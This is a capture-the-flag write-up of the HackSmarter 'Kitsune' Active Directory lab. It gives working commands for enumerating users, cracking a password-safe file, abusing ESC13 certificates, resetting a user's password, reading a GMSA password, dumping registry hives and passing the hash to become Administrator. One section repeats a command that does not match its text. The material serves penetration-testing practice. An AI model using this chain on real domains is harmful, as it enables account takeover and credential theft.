---
layout: article
title: "Kitsune"
date: 2026-11-26
platform: "HackSmarter"
excerpt: "Kitsune is an Easy Active Directory machine from HackSmarter that demonstrates guest share enumeration, password-safe cracking, ESC13 certificate abuse, BloodHound lateral movement, GMSA password retrieval, and domain compromise."
---

# Kitsune

Author: Brice Isezerano
Difficulty: Easy
Platform: HackSmarter

## Table of Contents

- [Objective](#objective)
- [Recon](#recon)
- [User Enumeration](#user-enumeration)
- [Enumerating Shares with enum4linux](#enumerating-shares-with-enum4linux)
- [Reading the Share with smbclient](#reading-the-share-with-smbclient)
- [Cracking the Password-Safe Database](#cracking-the-password-safe-database)
- [Initial Access](#initial-access)
- [BloodHound](#bloodhound)
- [Enumerating ADCS](#enumerating-adcs)
- [Exploiting ESC13](#exploiting-esc13)
- [Exploiting the schlop Account](#exploiting-the-schlop-account)
- [Authenticating as schlop](#authenticating-as-schlop)
- [User Flag](#user-flag)
- [Lateral Movement](#lateral-movement)
- [Authenticating as pebble](#authenticating-as-pebble)
- [Reading the GMSA Password](#reading-the-gmsa-password)
- [Root Flag](#root-flag)
- [Author's Thoughts](#authors-thoughts)

# Objective

This is an easy Active Directory machine from HackSmarter.

I was hired to perform an internal penetration test against the client's Domain Controller. The objective was to identify vulnerabilities and, if possible, fully compromise the domain.

# Recon

For an internal test, I began by scanning the target to identify open ports, services, versions, and possible attack paths.

I used RustScan to find open ports, followed by Nmap service and version discovery:

```bash
rustscan -a 10.1.157.213 -- -sC -sV -A --oN nmap
```

```text
Open 10.1.157.213:53
Open 10.1.157.213:88
Open 10.1.157.213:135
Open 10.1.157.213:139
Open 10.1.157.213:389
Open 10.1.157.213:445
Open 10.1.157.213:464
Open 10.1.157.213:593
Open 10.1.157.213:636
Open 10.1.157.213:3268
Open 10.1.157.213:3269
Open 10.1.157.213:3389
Open 10.1.157.213:5985
Open 10.1.157.213:9389
```

The Nmap results identified the target as `DC01.kitsune.local`, a Windows Domain Controller for `kitsune.local`. The most relevant services included:

- DNS on TCP 53
- Kerberos on TCP 88
- LDAP and LDAPS on TCP 389 and 636
- SMB on TCP 445
- RDP on TCP 3389
- WinRM on TCP 5985

Other observations included:

- SMB signing was enabled and required.
- The hostname was `DC01`.
- The DNS domain was `kitsune.local`.
- The RDP service identified Windows Server build 26100.

# User Enumeration

On a black-box assessment, I next attempted to enumerate valid domain users with Kerbrute. This kind of enumeration can be noisy and should be used cautiously during an authorized assessment.

![Kerbrute user enumeration]({{ '/assets/images/kitsune/image%201.png' | relative_url }})

Kerbrute identified the following valid users:

- Ross
- Administrator
- Ranch
- Pebble
- Guest

I initially focused on `ross` and tested for password reuse and username-as-password combinations.

![Testing credentials against domain users]({{ '/assets/images/kitsune/image%202.png' | relative_url }})

None of the enumerated users appeared kerberoastable or reused their username as a password. However, the `Guest` account was configured with the password `[REDACTED]`, and it could be used to enumerate accessible SMB shares.

# Enumerating Shares with enum4linux

Using the Guest credentials, I enumerated domain and SMB information with enum4linux.

![Enum4linux share enumeration]({{ '/assets/images/kitsune/image%203.png' | relative_url }})

The output showed that the Guest account could read the `Files` share.

# Reading the Share with smbclient

I authenticated to SMB with the Guest account and connected to the `Files` share.

```bash
smbclient //10.1.157.213/Files -U 'guest%[REDACTED]' 
```

The share contained several documents and a Password Safe database:

- 10-11-Calendar_October.pdf
- 10-11-Financial_Report.pdf
- 10-11-Timesheet.pdf
- `logins.psafe3`

I downloaded the database and the other files for further review:

```bash
get logins.psafe3
get 10-11-Calendar_October.pdf
get 10-11-Financial_Report.pdf
get 10-11-Timesheet.pdf
```

![Accessing the Files SMB share]({{ '/assets/images/kitsune/image%204.png' | relative_url }})

# Cracking the Password-Safe Database

The downloaded `logins.psafe3` file required a master password. I used `pwsafe2john` to extract the crackable hash:

```bash
pwsafe2john logins.psafe3 > login_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt login_hash.txt
```

The master password was successfully recovered as `[REDACTED]`.

The Password Safe database contained credentials for the `ranch` account:

```text
Username: ranch
Password: [REDACTED]
```

# Initial Access

I had gained valid credentials for the Ranch account and verified them over SMB:

```bash
nxc smb 10.1.157.213 -u ranch -p '[REDACTED]'
```

![Ranch SMB authentication]({{ '/assets/images/kitsune/image%205.png' | relative_url }})

# BloodHound

With the Ranch credentials, I collected the domain data with BloodHound:

```bash
bloodhound-python \
  -d kitsune.local \
  -u ranch \
  -p '[REDACTED]' \
  -dc DC01.kitsune.local \
  -ns 10.1.157.213 \
  -c All \
  --disable-autogc \
  --zip
```

The collection found users, groups, computers, OUs, and containers in the `kitsune.local` domain.

![BloodHound collection]({{ '/assets/images/kitsune/image%206.png' | relative_url }})

# Enumerating ADCS

I used Certipy to identify certificate services and potentially vulnerable certificate templates:

```bash
certipy-ad find \
  -target DC01.kitsune.local \
  -u ranch@kitsune.local \
  -p '[REDACTED]' \
  -dc-ip 10.1.157.213 \
  -stdout \
  -vulnerable
```

The output identified:

- CA: `kitsune-DC01-CA`
- Template: `Kitsune-User`
- Vulnerability: ESC13

The template allowed client authentication and had an issuance policy linked to the `HelpDesk` group. It was available to `Domain Users`, did not require manager approval, and did not require an authorized signature.

# Exploiting ESC13

## Requesting the Certificate

I requested a certificate using the vulnerable `Kitsune-User` template:

```bash
certipy-ad req \
  -u 'ranch@kitsune.local' \
  -p '[REDACTED]' \
  -ca 'kitsune-DC01-CA' \
  -target 'DC01.kitsune.local' \
  -dc-ip 10.1.157.213 \
  -template 'Kitsune-User' \
  -key-size 4096
```

![Requesting the ESC13 certificate]({{ '/assets/images/kitsune/image%207.png' | relative_url }})

The command saved a `ranch.pfx` certificate and private key.

## Authenticating with the Certificate

I used the certificate to obtain a Kerberos ticket and NTLM hash:

```bash
certipy-ad auth -pfx ranch.pfx -dc-ip 10.1.157.213
```

The authentication returned credentials for `ranch` and demonstrated that the certificate included the ESC13-linked HelpDesk identity.

The Ranch account now effectively had access associated with the `HelpDesk` group, and BloodHound showed that HelpDesk had `GenericAll` over the `schlop` account:

![HelpDesk GenericAll relationship]({{ '/assets/images/kitsune/image%208.png' | relative_url }})

# Exploiting the schlop Account

Because HelpDesk had `GenericAll` over schlop, I could reset the target user's password.

Using a Kerberos-authenticated BloodyAD request:

```bash
bloodyad \
  --host DC01.kitsune.local \
  -d kitsune.local \
  -k \
  set password schlop '[REDACTED]' 
```

The password change succeeded.

# Authenticating as schlop

I connected to the Domain Controller using Evil-WinRM:

```bash
evil-winrm -i 10.1.157.213 -u schlop -p '[REDACTED]'
```

![Authenticating as schlop]({{ '/assets/images/kitsune/image%209.png' | relative_url }})

The schlop account was a member of the Remote Management Users group, making WinRM access available.

# User Flag

After authentication, I changed to the user's Desktop and read `user.txt`:

```powershell
cd C:\Users\schlop\Desktop
type user.txt
```

The output contained the user flag:

```text
HSM{[REDACTED]}
```

![Reading the user flag]({{ '/assets/images/kitsune/image%2010.png' | relative_url }})

# Lateral Movement

Inside schlop's Documents directory, I found `networkAuth.cred`:

```powershell
cd C:\Users\schlop\Documents
ls
Get-Item networkAuth.cred
```

The file was a PowerShell credential created using `Export-Clixml`. It contained a username and a DPAPI-encrypted password.

Because the credential was created for schlop and was being accessed in schlop's session on the same machine, I could use `Import-Clixml` to decrypt it:

```powershell
$cred = Import-Clixml -Path networkAuth.cred
$cred.UserName
$cred.GetNetworkCredential().Password
```

The decrypted username and password were:

```text
Username: pebble
Password: [REDACTED]
```

# Authenticating as pebble

I used the recovered credentials to collect additional BloodHound data:

```bash
nxc ldap kitsune.local -u pebble -p '[REDACTED]' --gmsa
```

The BloodHound relationship showed that Pebble was in the `IT` group.

![Pebble BloodHound path]({{ '/assets/images/kitsune/image%2011.png' | relative_url }})

The IT group had `ReadGMSAPassword` rights over the `SVC_GMSA` account:

# Reading the GMSA Password

Because Pebble belonged to IT, I used NetExec to query the GMSA password:

```bash
nxc ldap kitsune.local -u pebble -p '[REDACTED]' --gmsa
```

The output identified:

```text
Account: svc_gmsa$
NTLM: [REDACTED]
PrincipalsAllowedToReadPassword: IT
```

![IT group reading the GMSA password]({{ '/assets/images/kitsune/image%2012.png' | relative_url }})

# Root Flag

I used the GMSA account to connect to the SYSVOL SMB share and downloaded the registry hive files.

```bash
smbclient //10.1.157.213/SYSVOL \
  -U 'KITSUNE.LOCAL/SVC_GMSA$%[REDACTED]' \
  --pw-nt-hash
```

At the SMB prompt:

```text
get SYSTEM
get SAM
get SECURITY
```

I then used Impacket SecretsDump to extract local secrets from the downloaded hives:

```bash
impacket-secretsdump \
  -sam SAM \
  -security SECURITY \
  -system SYSTEM \
  LOCAL
```

The dump revealed the local Administrator NTLM hash as `[REDACTED]`.

I used Evil-WinRM with Pass-the-Hash to authenticate:

```bash
evil-winrm -i 10.1.157.213 -u Administrator -H '[REDACTED]'
```

After connecting, I navigated to the Administrator's Desktop and retrieved `root.txt`:

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

The root flag was:

```text
HSM{[REDACTED]}
```

# Author's Thoughts

1. This machine was suitable for a beginner penetration tester because it introduced a clear chain of Active Directory weaknesses.
2. It required looking beyond a straightforward credential path, particularly for ESC13 abuse and DPAPI credential recovery.
3. It is a useful machine for beginning Active Directory penetration testing or red-team practice.
